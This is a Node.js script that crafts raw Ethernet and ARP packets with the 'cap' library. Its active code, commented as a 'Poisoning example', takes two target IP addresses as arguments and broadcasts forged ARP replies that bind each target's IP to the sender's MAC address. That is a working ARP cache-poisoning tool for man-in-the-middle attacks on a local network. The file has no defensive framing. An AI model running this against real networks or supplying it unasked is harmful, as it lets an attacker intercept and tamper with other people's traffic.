var Cap = require('cap').Cap,
    c = new Cap(),
	ip = require("ip"),
    device = Cap.findDevice(ip.address()),
	getmac = require('getmac').getMac,
    filter = 'arp',
    bufSize = 10 * 1024 * 1024,
    socketBuffer = new Buffer(65535),
	OPERATION = { 
	  REQUEST:  1,
	  REPLY: 2
	};

var linkType = c.open(device, filter, bufSize, socketBuffer);

var target1 = null, target2 = null;
		
if(process.argv.length < 4) {
} else {
  target1 = process.argv[2]
  target2 = process.argv[3]
  
}

getmac(function(err, macAddr) {
  var packet = createARPPacket();
  
  // Request example  
  /*packet.arp.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
  packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
  
  setMac(packet.eth.src_mac, macAddr)
  setMac(packet.arp.src_mac, macAddr)
  
  setIP(packet.arp.src_ip, "192.168.1.12")
  setIP(packet.arp.dst_ip, "192.168.1.1")
  
  send(packet.buffer)*/
  
  // Poisoning example
  if(target1 !== null && target2 !== null) {
    // Send reply from target1 to broadcast, advertising new hardware address
	packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2)
	
	packet.arp.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
    packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
	
	setMac(packet.arp.src_mac, macAddr);
	setMac(packet.eth.src_mac, macAddr);
	
    setIP(packet.arp.src_ip, target1);
	setIP(packet.arp.dst_ip, target2);
	
	send(packet.buffer);
	
	// Send reply from target2 to broadcast, advertising new hardware address
    packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2)
	
	packet.arp.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
    packet.eth.dst_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.dst_mac.length)
	
	setMac(packet.arp.src_mac, macAddr);
	setMac(packet.eth.src_mac, macAddr);
	
    setIP(packet.arp.src_ip, target2);
	setIP(packet.arp.dst_ip, target1);
	
	send(packet.buffer);
  }
  
});

var send = (buffer) => {
  try {
    console.log("Sending", buffer);
    c.send(buffer, buffer.length);
  } catch (e) {
    console.log("Error sending packet:", e);
  }
}

var setMac = (buffer, addr) => {
  // Poorly named; goes from the string "FF-FF-FF-FF-FF-FF" to 0xFFFFFFFFFFFF, then writes that value to buffer
  var mac = parseInt(addr.split("-").join(""), 16)
  buffer.writeUIntBE(mac, 0, 6);
}

var setIP = (buffer, ip) => {
  var ip_blocks = ip.split(".");
  for(var i = 0; i < ip_blocks.length; i++) {
    buffer.writeUIntBE(parseInt(ip_blocks[i]), i, 1)
  }
}

var createARPPacket = (buf) => {
  var buffer = buf;
  if(typeof buffer == "undefined") {
    var buffer = new Buffer([
      // ETHERNET
      0xff, 0xff, 0xff, 0xff, 0xff,0xff,                  // 0    = Destination MAC
      0x84, 0x8F, 0x69, 0xB7, 0x3D, 0x92,                 // 6    = Source MAC
      0x08, 0x06,                                         // 12   = EtherType = ARP
      // ARP
      0x00, 0x01,                                         // 14/0   = Hardware Type = Ethernet (or wifi)
      0x08, 0x00,                                         // 16/2   = Protocol type = ipv4 (request ipv4 route info)
      0x06, 0x04,                                         // 18/4   = Hardware Addr Len (Ether/MAC = 6), Protocol Addr Len (ipv4 = 4)
      0x00, 0x01,                                         // 20/6   = Operation (ARP, who-has)
      0x84, 0x8f, 0x69, 0xb7, 0x3d, 0x92,                 // 22/8   = Sender Hardware Addr (MAC)
      0xc0, 0xa8, 0x01, 0xc8,                             // 28/14  = Sender Protocol address (ipv4)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 // 32/18  = Target Hardware Address (Blank/nulls for who-has)
      0xc0, 0xa8, 0x01, 0xc9                              // 38/24  = Target Protocol address (ipv4)
    ]);
  }
  
  var packet = {
    eth: {
   	  dst_mac: buffer.slice(0,6),
	  src_mac: buffer.slice(6,12),
	  ethertype: buffer.slice(12,14)
    },
    arp: {
      hardwareType: buffer.slice(14,16),
      protocol: buffer.slice(16,18),
      hardwareAddressLen: buffer.slice(18,20),
      operation: buffer.slice(20,22),
      src_mac: buffer.slice(22,28),
      src_ip: buffer.slice(28,32),
      dst_mac: buffer.slice(32,38),
      dst_ip: buffer.slice(38,42)
    }
  }

  packet.buffer = buffer;
  
  return packet;
}
  